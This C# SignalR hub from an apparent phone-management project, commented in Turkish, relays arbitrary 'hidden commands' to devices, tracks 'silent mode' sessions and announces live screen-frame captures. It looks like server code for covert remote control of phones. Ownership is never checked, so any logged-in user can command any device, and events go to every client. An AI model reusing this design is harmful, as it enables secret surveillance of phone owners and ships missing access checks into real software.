using Microsoft.AspNetCore.SignalR;
using PhoneHub.Core.Models;
using PhoneHub.Infrastructure.Data;
using Microsoft.EntityFrameworkCore;
using System.Security.Claims;

namespace PhoneHub.API.Hubs;

public class SilentModeHub : Hub
{
    private readonly AppDbContext _dbContext;
    private readonly ILogger<SilentModeHub> _logger;

    public SilentModeHub(AppDbContext dbContext, ILogger<SilentModeHub> logger)
    {
        _dbContext = dbContext;
        _logger = logger;
    }

    public override async Task OnConnectedAsync()
    {
        var userId = Context.User?.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        _logger.LogInformation($"Kullanıcı bağlandı: {userId}, ConnectionId: {Context.ConnectionId}");
        await base.OnConnectedAsync();
    }

    public override async Task OnDisconnectedAsync(Exception? exception)
    {
        var userId = Context.User?.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        _logger.LogInformation($"Kullanıcı ayrıldı: {userId}, ConnectionId: {Context.ConnectionId}");
        await base.OnDisconnectedAsync(exception);
    }

    /// <summary>
    /// Cihaza bir gizli komut gönder
    /// </summary>
    public async Task SendHiddenCommand(Guid deviceId, Guid sessionId, string commandType, string? parameters)
    {
        try
        {
            var userId = Context.User?.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            if (string.IsNullOrEmpty(userId))
            {
                await Clients.Caller.SendAsync("Error", "Kimlik doğrulaması başarısız");
                return;
            }

            var device = await _dbContext.Devices
                .FirstOrDefaultAsync(d => d.Id == deviceId);

            if (device == null)
            {
                await Clients.Caller.SendAsync("Error", "Cihaz bulunamadı");
                return;
            }

            var command = new HiddenCommand
            {
                Id = Guid.NewGuid(),
                DeviceId = deviceId,
                SessionId = sessionId,
                CommandType = commandType,
                Parameters = parameters,
                CreatedAt = DateTime.UtcNow
            };

            _dbContext.HiddenCommands.Add(command);
            await _dbContext.SaveChangesAsync();

            // Cihaza komut gönder
            await Clients.Group($"device_{deviceId}").SendAsync(
                "ReceiveHiddenCommand",
                new
                {
                    commandId = command.Id,
                    commandType = command.CommandType,
                    parameters = command.Parameters,
                    timestamp = DateTime.UtcNow
                });

            _logger.LogWarning($"Gizli komut gönderildi - Cihaz: {deviceId}, Komut: {commandType}");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Gizli komut gönderirken hata oluştu");
            await Clients.Caller.SendAsync("Error", $"Hata: {ex.Message}");
        }
    }

    /// <summary>
    /// Cihazı bir gruba ekle (device_broadcast)
    /// </summary>
    public async Task JoinDeviceGroup(Guid deviceId)
    {
        try
        {
            await Groups.AddToGroupAsync(Context.ConnectionId, $"device_{deviceId}");
            _logger.LogInformation($"Cihaz grubuna katıldı: {deviceId}");
            await Clients.Group($"device_{deviceId}").SendAsync(
                "DeviceConnected",
                new { deviceId = deviceId, timestamp = DateTime.UtcNow });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Cihaz grubuna katılırken hata oluştu");
            await Clients.Caller.SendAsync("Error", $"Hata: {ex.Message}");
        }
    }

    /// <summary>
    /// Cihazı gruptan çıkar
    /// </summary>
    public async Task LeaveDeviceGroup(Guid deviceId)
    {
        try
        {
            await Groups.RemoveFromGroupAsync(Context.ConnectionId, $"device_{deviceId}");
            _logger.LogInformation($"Cihaz grubundan ayrıldı: {deviceId}");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Cihaz grubundan ayrılırken hata oluştu");
            await Clients.Caller.SendAsync("Error", $"Hata: {ex.Message}");
        }
    }

    /// <summary>
    /// Gizli oturum durumu güncelle
    /// </summary>
    public async Task UpdateSessionStatus(Guid sessionId, string status, int operationCount)
    {
        try
        {
            var session = await _dbContext.SilentModeSessions.FindAsync(sessionId);
            if (session != null)
            {
                session.OperationCount = operationCount;
                await _dbContext.SaveChangesAsync();

                await Clients.All.SendAsync("SessionStatusUpdated", new
                {
                    sessionId = sessionId,
                    status = status,
                    operationCount = operationCount,
                    timestamp = DateTime.UtcNow
                });
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Oturum durumu güncellenirken hata oluştu");
        }
    }

    /// <summary>
    /// Canlı ekran frame alındı bildirimi
    /// </summary>
    public async Task NotifyScreenFrameReceived(Guid deviceId, int width, int height, int fps)
    {
        try
        {
            await Clients.All.SendAsync("ScreenFrameReceived", new
            {
                deviceId = deviceId,
                width = width,
                height = height,
                fps = fps,
                timestamp = DateTime.UtcNow
            });
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Ekran frame bildirimi gönderilirken hata oluştu");
        }
    }
}
